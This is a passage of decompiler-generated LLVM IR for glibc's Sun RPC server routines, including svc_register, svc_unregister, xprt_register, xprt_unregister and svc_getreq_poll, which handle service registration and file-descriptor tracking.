  uselistorder i32 %v1_80640db, { 1, 0 }
  uselistorder i32 %v2_80640cd, { 0, 2, 3, 1 }
  uselistorder i32 %v2_80640c2, { 1, 0 }
  uselistorder i32 %v2_806409a, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80640c9, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_80640a9, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-132 = alloca i32, align 4
  %v2_80640fd = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80640fd, i32* @edx, align 4
  %tmp8 = bitcast i32* %stack_var_-132 to i8*
  store i32 %v2_80640fd, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8064108 = call i8* @_memset(i8* %tmp8, i32 0, i32 32)
  store i32 %arg1, i32* %stack_var_-132, align 4
  %v2_806411d = call i32 @svc_getreqset(i32* nonnull %stack_var_-132)
  ret i32 %v2_806411d

; uselistorder directives
  uselistorder i32* %stack_var_-132, { 0, 2, 1, 3 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_806412a = load i32, i32* @ebp, align 4
  %v0_806412b = load i32, i32* @edi, align 4
  %v0_806412c = load i32, i32* @esi, align 4
  %v0_806412d = load i32, i32* @ebx, align 4
  store i32 %v0_806412d, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebp, align 4
  %v2_8064135 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8064135, i32* @ecx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @eax, align 4
  store i32 %arg2, i32* @edx, align 4
  %v3_8064141 = call i32 @svc_find(i32 %v0_806412d, i32 %v0_806412c, i32 %v0_806412b)
  %v1_8064146 = icmp eq i32 %v3_8064141, 0
  store i32 %v3_8064141, i32* @ebx, align 4
  br i1 %v1_8064146, label %entry.dec_label_pc_8064180_crit_edge, label %dec_label_pc_806414c

entry.dec_label_pc_8064180_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8064180

dec_label_pc_806414c:                             ; preds = %entry
  %v3_806414c = load i32, i32* %stack_var_-20, align 4
  %v1_8064150 = inttoptr i32 %v3_8064141 to i32*
  %v2_8064150 = load i32, i32* %v1_8064150, align 4
  store i32 %v2_8064150, i32* @esi, align 4
  %v1_8064152 = icmp eq i32 %v3_806414c, 0
  %v1_8064154 = icmp eq i1 %v1_8064152, false
  br i1 %v1_8064154, label %dec_label_pc_8064163, label %dec_label_pc_8064156

dec_label_pc_8064156:                             ; preds = %dec_label_pc_806414c
  %v0_8064156 = load i32, i32* %stack_var_-16, align 4
  %v1_8064156 = call i32 @__rpc_thread_variables(i32 %v0_8064156)
  %v0_806415b = load i32, i32* @esi, align 4
  %v2_806415b = add i32 %v1_8064156, 184
  %v3_806415b = inttoptr i32 %v2_806415b to i32*
  store i32 %v0_806415b, i32* %v3_806415b, align 4
  br label %dec_label_pc_8064165

dec_label_pc_8064163:                             ; preds = %dec_label_pc_806414c
  %v2_8064163 = inttoptr i32 %v3_806414c to i32*
  store i32 %v2_8064150, i32* %v2_8064163, align 4
  br label %dec_label_pc_8064165

dec_label_pc_8064165:                             ; preds = %dec_label_pc_8064156, %dec_label_pc_8064163
  %v0_8064168 = load i32, i32* @ebx, align 4
  %v1_8064168 = inttoptr i32 %v0_8064168 to i32*
  store i32 0, i32* %v1_8064168, align 4
  %v0_806416e = load i32, i32* @ebx, align 4
  %v1_806416f = call i32 @free(i32 %v0_806416e)
  %v0_8064176 = load i32, i32* @edi, align 4
  %v1_8064178 = call i32 @__GI_pmap_unset(i32 %v0_8064176)
  br label %dec_label_pc_8064180

dec_label_pc_8064180:                             ; preds = %entry.dec_label_pc_8064180_crit_edge, %dec_label_pc_8064165
  %v0_8064187 = phi i32 [ 0, %entry.dec_label_pc_8064180_crit_edge ], [ %v1_8064178, %dec_label_pc_8064165 ]
  %v2_8064183 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8064183, i32* @ebx, align 4
  store i32 %v0_806412c, i32* @esi, align 4
  store i32 %v0_806412b, i32* @edi, align 4
  store i32 %v0_806412a, i32* @ebp, align 4
  ret i32 %v0_8064187

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064180, { 1, 0 }
  uselistorder label %dec_label_pc_8064165, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  br label %dec_label_pc_806419d

dec_label_pc_806418d:                             ; preds = %dec_label_pc_806419d
  %v0_806418d = load i32, i32* @ecx, align 4
  %v1_806418f = add i32 %v3_80641a2, 8
  %v2_806418f = inttoptr i32 %v1_806418f to i32*
  %v3_806418f = load i32, i32* %v2_806418f, align 4
  %v1_8064192 = add i32 %v3_80641a2, 4
  %v2_8064192 = inttoptr i32 %v1_8064192 to i32*
  %v3_8064192 = load i32, i32* %v2_8064192, align 4
  %v4_8064195 = call i32 @svc_unregister(i32 %v3_8064192, i32 %v3_806418f, i32 %v0_806418d, i32 %v0_806418d)
  br label %dec_label_pc_806419d

dec_label_pc_806419d:                             ; preds = %entry, %dec_label_pc_806418d
  %v0_806419d = phi i32 [ %v3_8064192, %dec_label_pc_806418d ], [ %tmp7, %entry ]
  %v1_806419d = call i32 @__rpc_thread_variables(i32 %v0_806419d)
  %v1_80641a2 = add i32 %v1_806419d, 184
  %v2_80641a2 = inttoptr i32 %v1_80641a2 to i32*
  %v3_80641a2 = load i32, i32* %v2_80641a2, align 4
  %v1_80641a8 = icmp eq i32 %v3_80641a2, 0
  %v1_80641aa = icmp eq i1 %v1_80641a8, false
  br i1 %v1_80641aa, label %dec_label_pc_806418d, label %dec_label_pc_80641ac

dec_label_pc_80641ac:                             ; preds = %dec_label_pc_806419d
  ret i32 %v3_80641a2

; uselistorder directives
  uselistorder i32 %v3_80641a2, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_806419d, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_80641b1 = load i32, i32* @edi, align 4
  %v0_80641b2 = load i32, i32* @esi, align 4
  %v0_80641b3 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  %v2_80641bb = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80641bb, i32* @ecx, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg4, i32* @ebp, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg3, i32* @edx, align 4
  %v3_80641cb = call i32 @svc_find(i32 %v0_80641b3, i32 %v0_80641b2, i32 %v0_80641b1)
  store i32 %v3_80641cb, i32* %eax.global-to-local, align 4
  %v1_80641d0 = icmp eq i32 %v3_80641cb, 0
  br i1 %v1_80641d0, label %dec_label_pc_80641db, label %dec_label_pc_80641d4

dec_label_pc_80641d4:                             ; preds = %entry
  %v1_80641d4 = add i32 %v3_80641cb, 12
  %v2_80641d4 = inttoptr i32 %v1_80641d4 to i32*
  %v3_80641d4 = load i32, i32* %v2_80641d4, align 4
  %v4_80641d4 = load i32, i32* @ebp, align 4
  %v15_80641d4 = icmp eq i32 %v3_80641d4, %v4_80641d4
  %v1_80641d7 = icmp eq i1 %v15_80641d4, false
  br i1 %v1_80641d7, label %dec_label_pc_806422f, label %dec_label_pc_806420a

dec_label_pc_80641db:                             ; preds = %entry
  store i32 16, i32* %stack_var_-60, align 4
  %v1_80641e0 = call i32 @malloc(i32 16)
  store i32 %v1_80641e0, i32* %eax.global-to-local, align 4
  %v1_80641e8 = icmp eq i32 %v1_80641e0, 0
  store i32 %v1_80641e0, i32* @ebx, align 4
  br i1 %v1_80641e8, label %dec_label_pc_806422f, label %dec_label_pc_80641ee

dec_label_pc_80641ee:                             ; preds = %dec_label_pc_80641db
  %v0_80641ee = load i32, i32* @edi, align 4
  %v2_80641ee = add i32 %v1_80641e0, 4
  %v3_80641ee = inttoptr i32 %v2_80641ee to i32*
  store i32 %v0_80641ee, i32* %v3_80641ee, align 4
  %v0_80641f1 = load i32, i32* @esi, align 4
  %v1_80641f1 = load i32, i32* %eax.global-to-local, align 4
  %v2_80641f1 = add i32 %v1_80641f1, 8
  %v3_80641f1 = inttoptr i32 %v2_80641f1 to i32*
  store i32 %v0_80641f1, i32* %v3_80641f1, align 4
  %v0_80641f4 = load i32, i32* @ebp, align 4
  %v1_80641f4 = load i32, i32* %eax.global-to-local, align 4
  %v2_80641f4 = add i32 %v1_80641f4, 12
  %v3_80641f4 = inttoptr i32 %v2_80641f4 to i32*
  store i32 %v0_80641f4, i32* %v3_80641f4, align 4
  %v0_80641f7 = load i32, i32* %stack_var_-60, align 4
  %v1_80641f7 = call i32 @__rpc_thread_variables(i32 %v0_80641f7)
  store i32 %v1_80641f7, i32* %eax.global-to-local, align 4
  %v1_80641fc = add i32 %v1_80641f7, 184
  %v2_80641fc = inttoptr i32 %v1_80641fc to i32*
  %v3_80641fc = load i32, i32* %v2_80641fc, align 4
  %v1_8064202 = load i32, i32* @ebx, align 4
  %v2_8064202 = inttoptr i32 %v1_8064202 to i32*
  store i32 %v3_80641fc, i32* %v2_8064202, align 4
  %v0_8064204 = load i32, i32* @ebx, align 4
  store i32 %v0_8064204, i32* %v2_80641fc, align 4
  br label %dec_label_pc_806420a

dec_label_pc_806420a:                             ; preds = %dec_label_pc_80641d4, %dec_label_pc_80641ee
  %v4_806420a = icmp eq i32 %arg5, 0
  store i32 1, i32* %eax.global-to-local, align 4
  br i1 %v4_806420a, label %dec_label_pc_8064231, label %dec_label_pc_8064216

dec_label_pc_8064216:                             ; preds = %dec_label_pc_806420a
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_806421a = add i32 %arg1, 4
  %v2_806421a = inttoptr i32 %v1_806421a to i16*
  %v3_806421a = load i16, i16* %v2_806421a, align 2
  %v4_806421a = zext i16 %v3_806421a to i32
  store i32 %v4_806421a, i32* %eax.global-to-local, align 4
  %v0_8064223 = load i32, i32* @esi, align 4
  %v0_8064224 = load i32, i32* @edi, align 4
  store i32 %v0_8064224, i32* %stack_var_-60, align 4
  %v5_8064225 = call i32 @pmap_set(i32 %v0_8064224, i32 %v0_8064223, i32 %arg5, i16 %v3_806421a)
  store i32 %v5_8064225, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064231

dec_label_pc_806422f:                             ; preds = %dec_label_pc_80641db, %dec_label_pc_80641d4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064231

dec_label_pc_8064231:                             ; preds = %dec_label_pc_806420a, %dec_label_pc_8064216, %dec_label_pc_806422f
  %v0_8064238 = phi i32 [ 1, %dec_label_pc_806420a ], [ %v5_8064225, %dec_label_pc_8064216 ], [ 0, %dec_label_pc_806422f ]
  ret i32 %v0_8064238

; uselistorder directives
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @svc_find, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8064231, { 2, 1, 0 }
  uselistorder label %dec_label_pc_806420a, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1) local_unnamed_addr {
entry:
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v0_8064239 = load i32, i32* @esi, align 4
  %v0_806423a = load i32, i32* @ebx, align 4
  store i32 %v0_806423a, i32* %stack_var_-8, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v2_8064242 = load i32, i32* %arg1, align 4
  store i32 %v2_8064242, i32* @ebx, align 4
  %v2_8064244 = call i32 @_rpc_dtablesize(i32 %v0_806423a, i32 %v0_8064239)
  %v0_8064249 = load i32, i32* @ebx, align 4
  %v5_806424b = icmp slt i32 %v0_8064249, %v2_8064244
  br i1 %v5_806424b, label %dec_label_pc_806424d, label %dec_label_pc_80642ac

dec_label_pc_806424d:                             ; preds = %entry
  %v0_806424d = load i32, i32* %stack_var_-8, align 4
  %v1_806424d = call i32 @__rpc_thread_variables(i32 %v0_806424d)
  %v0_8064252 = load i32, i32* @ebx, align 4
  %v1_8064252 = mul i32 %v0_8064252, 4
  %v1_8064259 = add i32 %v1_806424d, 180
  %v2_8064259 = inttoptr i32 %v1_8064259 to i32*
  %v3_8064259 = load i32, i32* %v2_8064259, align 4
  %v2_806425f = add i32 %v3_8064259, %v1_8064252
  %v3_806425f = inttoptr i32 %v2_806425f to i32*
  %v4_806425f = load i32, i32* %v3_806425f, align 4
  %v5_806425f = load i32, i32* @esi, align 4
  %v16_806425f = icmp eq i32 %v4_806425f, %v5_806425f
  %v1_8064262 = icmp eq i1 %v16_806425f, false
  br i1 %v1_8064262, label %dec_label_pc_80642ac, label %dec_label_pc_8064264

dec_label_pc_8064264:                             ; preds = %dec_label_pc_806424d
  %v1_8064264 = add i32 %v0_8064252, -1023
  %v6_8064264 = sub i32 1022, %v0_8064252
  %v7_8064264 = and i32 %v6_8064264, %v0_8064252
  %v8_8064264 = icmp slt i32 %v7_8064264, 0
  %v9_8064264 = icmp eq i32 %v1_8064264, 0
  %v10_8064264 = icmp slt i32 %v1_8064264, 0
  store i32 0, i32* %v3_806425f, align 4
  %v3_8064271 = icmp eq i1 %v10_8064264, %v8_8064264
  %v4_8064271 = icmp eq i1 %v9_8064264, false
  %v5_8064271 = and i1 %v4_8064271, %v3_8064271
  br i1 %v5_8064271, label %dec_label_pc_8064286, label %dec_label_pc_8064273

dec_label_pc_8064273:                             ; preds = %dec_label_pc_8064264
  %v0_8064273 = call i32 @__GI___rpc_thread_svc_fdset()
  %v0_8064278 = load i32, i32* @ebx, align 4
  %v2_806427c = udiv i32 %v0_8064278, 32
  store i32 %v2_806427c, i32* @ecx, align 4
  %v1_806427f = urem i32 %v0_8064278, 32
  %v2_8064282 = mul nuw nsw i32 %v2_806427c, 4
  %v3_8064282 = add i32 %v2_8064282, %v0_8064273
  %v4_8064282 = inttoptr i32 %v3_8064282 to i32*
  %v5_8064282 = load i32, i32* %v4_8064282, align 4
  %v8_8064282 = shl i32 1, %v1_806427f
  %v11_8064282 = sub i32 -1, %v8_8064282
  %v12_8064282 = and i32 %v5_8064282, %v11_8064282
  store i32 %v12_8064282, i32* %v4_8064282, align 4
  br label %dec_label_pc_8064286

dec_label_pc_8064286:                             ; preds = %dec_label_pc_8064264, %dec_label_pc_8064273
  br label %dec_label_pc_80642a3

dec_label_pc_806428a:                             ; preds = %dec_label_pc_80642a3
  %v0_806428a = call i32 @__rpc_thread_svc_pollfd()
  %v0_806428f = load i32, i32* @esi, align 4
  %v1_806428f = mul i32 %v0_806428f, 8
  %v2_8064296 = inttoptr i32 %v0_806428a to i32*
  %v3_8064296 = load i32, i32* %v2_8064296, align 4
  %v4_8064296 = add i32 %v3_8064296, %v1_806428f
  %v1_8064298 = inttoptr i32 %v4_8064296 to i32*
  %v2_8064298 = load i32, i32* %v1_8064298, align 4
  %v3_8064298 = load i32, i32* @ebx, align 4
  %v14_8064298 = icmp eq i32 %v2_8064298, %v3_8064298
  %v1_806429a = icmp eq i1 %v14_8064298, false
  br i1 %v1_806429a, label %dec_label_pc_80642a2, label %dec_label_pc_806429c

dec_label_pc_806429c:                             ; preds = %dec_label_pc_806428a
  store i32 -1, i32* %v1_8064298, align 4
  %v0_80642a2.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80642a2

dec_label_pc_80642a2:                             ; preds = %dec_label_pc_806428a, %dec_label_pc_806429c
  %v0_80642a2 = phi i32 [ %v0_806428f, %dec_label_pc_806428a ], [ %v0_80642a2.pre, %dec_label_pc_806429c ]
  %v1_80642a2 = add i32 %v0_80642a2, 1
  br label %dec_label_pc_80642a3

dec_label_pc_80642a3:                             ; preds = %dec_label_pc_8064286, %dec_label_pc_80642a2
  %storemerge = phi i32 [ 0, %dec_label_pc_8064286 ], [ %v1_80642a2, %dec_label_pc_80642a2 ]
  store i32 %storemerge, i32* @esi, align 4
  %v0_80642a3 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_80642a8 = load i32, i32* @esi, align 4
  %v2_80642a8 = inttoptr i32 %v0_80642a3 to i32*
  %v3_80642a8 = load i32, i32* %v2_80642a8, align 4
  %v5_80642aa = icmp slt i32 %v0_80642a8, %v3_80642a8
  br i1 %v5_80642aa, label %dec_label_pc_806428a, label %dec_label_pc_80642ac

dec_label_pc_80642ac:                             ; preds = %dec_label_pc_80642a3, %entry, %dec_label_pc_806424d
  %v0_80642af = phi i32 [ %v2_8064244, %entry ], [ %v3_8064259, %dec_label_pc_806424d ], [ %v0_80642a3, %dec_label_pc_80642a3 ]
  %v2_80642ad = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80642ad, i32* @ebx, align 4
  store i32 %v0_8064239, i32* @esi, align 4
  ret i32 %v0_80642af

; uselistorder directives
  uselistorder i32 %v2_806427c, { 1, 0 }
  uselistorder i32 %v0_8064278, { 1, 0 }
  uselistorder i32 %v1_8064264, { 1, 0 }
  uselistorder i32 %v3_8064259, { 1, 0 }
  uselistorder i32 %v0_8064252, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80642ac, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80642a3, { 1, 0 }
  uselistorder label %dec_label_pc_80642a2, { 1, 0 }
  uselistorder label %dec_label_pc_8064286, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edi, align 4
  store i32 0, i32* @esi, align 4
  %v0_80642b7 = load i32, i32* @ebx, align 4
  store i32 %v0_80642b7, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* @ebp, align 4
  br label %dec_label_pc_8064301

dec_label_pc_80642c1:                             ; preds = %dec_label_pc_806430a
  %v2_80642c5 = mul i32 %v0_8064306, 8
  %v3_80642c5 = add i32 %v2_80642c5, %arg1
  %v1_80642c8 = inttoptr i32 %v3_80642c5 to i32*
  %v2_80642c8 = load i32, i32* %v1_80642c8, align 4
  store i32 %v2_80642c8, i32* @ebx, align 4
  %v10_80642ca = icmp eq i32 %v2_80642c8, -1
  br i1 %v10_80642ca, label %dec_label_pc_8064300, label %dec_label_pc_80642cf

dec_label_pc_80642cf:                             ; preds = %dec_label_pc_80642c1
  %v1_80642cf = add i32 %v3_80642c5, 6
  %v2_80642cf = inttoptr i32 %v1_80642cf to i16*
  %v3_80642cf = load i16, i16* %v2_80642cf, align 2
  %v5_80642cf = trunc i16 %v3_80642cf to i8
  %v2_80642d3 = icmp eq i8 %v5_80642cf, 0
  br i1 %v2_80642d3, label %dec_label_pc_8064300, label %dec_label_pc_80642d7

dec_label_pc_80642d7:                             ; preds = %dec_label_pc_80642cf
  %v1_80642d7 = add i32 %v0_806430a, 1
  store i32 %v1_80642d7, i32* @edi, align 4
  %v3_80642d8 = and i8 %v5_80642cf, 32
  %v4_80642d8 = icmp eq i8 %v3_80642d8, 0
  br i1 %v4_80642d8, label %dec_label_pc_80642f4, label %dec_label_pc_80642dc

dec_label_pc_80642dc:                             ; preds = %dec_label_pc_80642d7
  %v0_80642dc = load i32, i32* %stack_var_-16, align 4
  %v1_80642dc = call i32 @__rpc_thread_variables(i32 %v0_80642dc)
  %v1_80642e4 = add i32 %v1_80642dc, 180
  %v2_80642e4 = inttoptr i32 %v1_80642e4 to i32*
  %v3_80642e4 = load i32, i32* %v2_80642e4, align 4
  %v1_80642ea = load i32, i32* @ebx, align 4
  %v2_80642ea = mul i32 %v1_80642ea, 4
  %v3_80642ea = add i32 %v2_80642ea, %v3_80642e4
  %v4_80642ea = inttoptr i32 %v3_80642ea to i32*
  %v5_80642ea = load i32, i32* %v4_80642ea, align 4
  %v1_80642ed = inttoptr i32 %v5_80642ea to i32*
  %v2_80642ed = call i32 @xprt_unregister(i32* %v1_80642ed)
  br label %dec_label_pc_80642fd

dec_label_pc_80642f4:                             ; preds = %dec_label_pc_80642d7
  %v1_80642f8 = call i32 @svc_getreq_common(i32 %v2_80642c8)
  br label %dec_label_pc_80642fd

dec_label_pc_80642fd:                             ; preds = %dec_label_pc_80642dc, %dec_label_pc_80642f4
  %v0_8064300.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8064300

dec_label_pc_8064300:                             ; preds = %dec_label_pc_80642cf, %dec_label_pc_80642c1, %dec_label_pc_80642fd
  %v0_8064300 = phi i32 [ %v0_8064306, %dec_label_pc_80642cf ], [ %v0_8064306, %dec_label_pc_80642c1 ], [ %v0_8064300.pre, %dec_label_pc_80642fd ]
  %v1_8064300 = add i32 %v0_8064300, 1
  store i32 %v1_8064300, i32* @esi, align 4
  br label %dec_label_pc_8064301

dec_label_pc_8064301:                             ; preds = %entry, %dec_label_pc_8064300
  %v0_8064301 = call i32 @__rpc_thread_svc_max_pollfd()
  %v0_8064306 = load i32, i32* @esi, align 4
  %v2_8064306 = inttoptr i32 %v0_8064301 to i32*
  %v3_8064306 = load i32, i32* %v2_8064306, align 4
  %v5_8064308 = icmp slt i32 %v0_8064306, %v3_8064306
  br i1 %v5_8064308, label %dec_label_pc_806430a, label %dec_label_pc_806430e

dec_label_pc_806430a:                             ; preds = %dec_label_pc_8064301
  %v0_806430a = load i32, i32* @edi, align 4
  %v1_806430a = load i32, i32* @ebp, align 4
  %v5_806430c = icmp slt i32 %v0_806430a, %v1_806430a
  br i1 %v5_806430c, label %dec_label_pc_80642c1, label %dec_label_pc_806430e

dec_label_pc_806430e:                             ; preds = %dec_label_pc_8064301, %dec_label_pc_806430a
  ret i32 %v0_8064301

; uselistorder directives
  uselistorder i32 %v0_806430a, { 1, 0 }
  uselistorder i32 %v0_8064306, { 3, 2, 1, 0 }
  uselistorder i32 %v2_80642c8, { 1, 0, 2 }
  uselistorder i32 (i32)* @svc_getreq_common, { 1, 0 }
  uselistorder label %dec_label_pc_806430e, { 1, 0 }
  uselistorder label %dec_label_pc_8064301, { 1, 0 }
  uselistorder label %dec_label_pc_8064300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80642fd, { 1, 0 }
}

define i32 @xprt_register(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %stack_var_-24 = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp9, i32* %stack_var_-24, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8064317 = load i32, i32* @esi, align 4
  %v0_8064318 = load i32, i32* @ebx, align 4
  store i32 %v0_8064318, i32* %stack_var_-12, align 4
  %v1_8064319 = call i32 @__rpc_thread_variables(i32 %v0_8064318)
  store i32 %v1_8064319, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v2_8064322 = load i32, i32* %arg1, align 4
  store i32 %v2_8064322, i32* @edi, align 4
  %v1_8064324 = add i32 %v1_8064319, 180
  %v2_8064324 = inttoptr i32 %v1_8064324 to i32*
  %v3_8064324 = load i32, i32* %v2_8064324, align 4
  %v4_8064324 = icmp eq i32 %v3_8064324, 0
  store i32 %v1_8064319, i32* @ebx, align 4
  %v1_806432d = icmp eq i1 %v4_8064324, false
  br i1 %v1_806432d, label %dec_label_pc_8064351, label %dec_label_pc_806432f

dec_label_pc_806432f:                             ; preds = %entry
  %v0_806432f = load i32, i32* %stack_var_-12, align 4
  %v2_806432f = call i32 @_rpc_dtablesize(i32 %v0_806432f, i32 %v0_8064317)
  %v2_8064337 = mul i32 %v2_806432f, 4
  store i32 %v2_8064337, i32* %eax.global-to-local, align 4
  store i32 %v2_8064337, i32* %stack_var_-28, align 4
  %v1_806433b = call i32 @malloc(i32 %v2_8064337)
  store i32 %v1_806433b, i32* %eax.global-to-local, align 4
  %v1_8064343 = icmp eq i32 %v1_806433b, 0
  %v1_8064345 = load i32, i32* @ebx, align 4
  %v2_8064345 = add i32 %v1_8064345, 180
  %v3_8064345 = inttoptr i32 %v2_8064345 to i32*
  store i32 %v1_806433b, i32* %v3_8064345, align 4
  br i1 %v1_8064343, label %dec_label_pc_80643eb, label %dec_label_pc_806432f.dec_label_pc_8064351_crit_edge

dec_label_pc_806432f.dec_label_pc_8064351_crit_edge: ; preds = %dec_label_pc_806432f
  %v0_8064351.pre = load i32, i32* %stack_var_-28, align 4
  %v1_8064351.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_8064351

dec_label_pc_8064351:                             ; preds = %dec_label_pc_806432f.dec_label_pc_8064351_crit_edge, %entry
  %v1_8064351 = phi i32 [ %v1_8064351.pre, %dec_label_pc_806432f.dec_label_pc_8064351_crit_edge ], [ %tmp9, %entry ]
  %v0_8064351 = phi i32 [ %v0_8064351.pre, %dec_label_pc_806432f.dec_label_pc_8064351_crit_edge ], [ %tmp8, %entry ]
  %v2_8064351 = call i32 @_rpc_dtablesize(i32 %v0_8064351, i32 %v1_8064351)
  store i32 %v2_8064351, i32* %eax.global-to-local, align 4
  %v0_8064356 = load i32, i32* @edi, align 4
  %v5_8064358 = icmp slt i32 %v0_8064356, %v2_8064351
  br i1 %v5_8064358, label %dec_label_pc_806435e, label %dec_label_pc_80643eb

dec_label_pc_806435e:                             ; preds = %dec_label_pc_8064351
  %v0_806435e = load i32, i32* @ebx, align 4
  %v1_806435e = add i32 %v0_806435e, 180
  %v2_806435e = inttoptr i32 %v1_806435e to i32*
  %v3_806435e = load i32, i32* %v2_806435e, align 4
  store i32 %v3_806435e, i32* %eax.global-to-local, align 4
  %v1_8064364 = add i32 %v0_8064356, -1023
  %v6_8064364 = sub i32 1022, %v0_8064356
  %v7_8064364 = and i32 %v6_8064364, %v0_8064356
  %v8_8064364 = icmp slt i32 %v7_8064364, 0
  %v9_8064364 = icmp eq i32 %v1_8064364, 0
  %v10_8064364 = icmp slt i32 %v1_8064364, 0
  %v0_806436a = load i32, i32* @esi, align 4
  %v3_806436a = mul i32 %v0_8064356, 4
  %v4_806436a = add i32 %v3_806435e, %v3_806436a
  %v5_806436a = inttoptr i32 %v4_806436a to i32*
  store i32 %v0_806436a, i32* %v5_806436a, align 4
  %v3_806436d = icmp eq i1 %v10_8064364, %v8_8064364
  %v4_806436d = icmp eq i1 %v9_8064364, false
  %v5_806436d = and i1 %v4_806436d, %v3_806436d
  br i1 %v5_806436d, label %dec_label_pc_8064382, label %dec_label_pc_806436f

dec_label_pc_806436f:                             ; preds = %dec_label_pc_806435e
  %v0_806436f = call i32 @__GI___rpc_thread_svc_fdset()
  store i32 %v0_806436f, i32* %eax.global-to-local, align 4
  %v0_8064374 = load i32, i32* @edi, align 4
  %v2_8064378 = udiv i32 %v0_8064374, 32
  store i32 %v2_8064378, i32* @ecx, align 4
  %v1_806437b = urem i32 %v0_8064374, 32
  store i32 %v1_806437b, i32* %edx.global-to-local, align 4
  %v2_806437e = mul nuw nsw i32 %v2_8064378, 4
  %v3_806437e = add i32 %v2_806437e, %v0_806436f
  %v4_806437e = inttoptr i32 %v3_806437e to i32*
  %v5_806437e = load i32, i32* %v4_806437e, align 4
  %v8_806437e = shl i32 1, %v1_806437b
  %v11_806437e = or i32 %v5_806437e, %v8_806437e
  store i32 %v11_806437e, i32* %v4_806437e, align 4
  br label %dec_label_pc_8064382

dec_label_pc_8064382:                             ; preds = %dec_label_pc_806435e, %dec_label_pc_806436f
  br label %dec_label_pc_80643a9

dec_label_pc_8064386:                             ; preds = %dec_label_pc_80643a9
  %v0_8064386 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_8064386, i32* %eax.global-to-local, align 4
  %v0_806438b = load i32, i32* @ebx, align 4
  %v1_806438b = mul i32 %v0_806438b, 8
  store i32 %v1_806438b, i32* @ecx, align 4
  store i32 %v1_806438b, i32* %edx.global-to-local, align 4
  %v2_8064394 = inttoptr i32 %v0_8064386 to i32*
  %v3_8064394 = load i32, i32* %v2_8064394, align 4
  %v4_8064394 = add i32 %v3_8064394, %v1_806438b
  store i32 %v4_8064394, i32* %edx.global-to-local, align 4
  %v1_8064396 = inttoptr i32 %v4_8064394 to i32*
  %v2_8064396 = load i32, i32* %v1_8064396, align 4
  %v12_8064396 = icmp eq i32 %v2_8064396, -1
  %v1_8064399 = icmp eq i1 %v12_8064396, false
  br i1 %v1_8064399, label %dec_label_pc_80643a8, label %dec_label_pc_806439b

dec_label_pc_806439b:                             ; preds = %dec_label_pc_8064386
  %v0_806439b = load i32, i32* @edi, align 4
  store i32 %v0_806439b, i32* %v1_8064396, align 4
  %v2_806439d = load i32, i32* %v2_8064394, align 4
  store i32 %v2_806439d, i32* %eax.global-to-local, align 4
  %v1_806439f = load i32, i32* @ecx, align 4
  %v2_806439f = add i32 %v2_806439d, 4
  %v3_806439f = add i32 %v2_806439f, %v1_806439f
  %v4_806439f = inttoptr i32 %v3_806439f to i16*
  store i16 195, i16* %v4_806439f, align 2
  br label %dec_label_pc_80643eb

